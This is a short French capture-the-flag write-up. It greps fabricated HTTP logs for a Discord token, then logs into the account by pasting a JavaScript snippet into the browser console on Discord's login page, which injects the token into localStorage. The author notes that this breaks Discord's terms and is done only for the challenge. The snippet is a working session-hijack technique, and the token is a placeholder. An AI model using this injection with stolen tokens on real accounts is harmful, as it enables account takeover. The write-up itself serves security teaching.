# Write up - toktok didi
### présentation
On télécharge le [zip fourni - lien obsolète](https://limewire.com/d/vtYyd#LK6n71NgMM).
Il contient `script.py`, qui dévoile comment ont été généré les faux fichiers de log.
Le répertoire log contient de nombreux fichier log de requête HTTP.
### trouver le token
L'énoncé nous demande de trouver un token discord.
Dans _log/_, On tente donc simplement la commande `grep -ri "token"` 
```bash
access_log_20241123-022610.log:36.165.234.1 - - [23/Nov/2024:03:19:55 +0200] "GET /api/v9/channels/987654321/messages?token=TOKEN&limit=50 HTTP/1.0" 200 2341 "https://discord.com/channels/123456789/987654321" "Mozilla/5.0 (Android 7.1.2; Mobile; rv:54.0) Gecko/54.0 Firefox/54.0"
```
Il n'y a donc même pas de faux token discord ou d'autres token que discord. Aucun faux positif.
il était donc très facile à trouver.
### connection au compte discord
Se connecter à un compte discord non-bot à partir de son token enfreint les CGU discord.
C'est uniquement pour un challenge et pour des raisons pédagogique qu'on le fait ici.

On se va à la [page web de login discord](https://discord.com/login)
On injecte ce code javascript dans la console du navigateur (pour moi, `CTRL + SHIFT + K`).
```python
setInterval(() => {
  document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token = `"TOKEN"`;
}, 50);

setTimeout(() => {
  location.reload();
}, 100);
```
On est connecté dans le compte discord.
On accède à la description du profil, qui contient le flag. 
